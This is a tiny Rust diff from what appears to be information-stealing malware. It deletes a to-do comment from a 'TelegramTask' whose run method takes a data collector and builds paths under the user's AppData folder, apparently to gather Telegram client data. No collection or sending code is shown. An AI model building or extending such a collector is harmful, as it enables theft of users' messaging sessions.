@@ -9,7 +9,6 @@ use utils::path::Path;
 pub(super) struct TelegramTask;
 
 impl Task for TelegramTask {
-    // TODO: Impl collector
     unsafe fn run(&self, parent: &Path, collector: &AtomicCollector) {
         let appdata = &Path::appdata();
         let paths = [
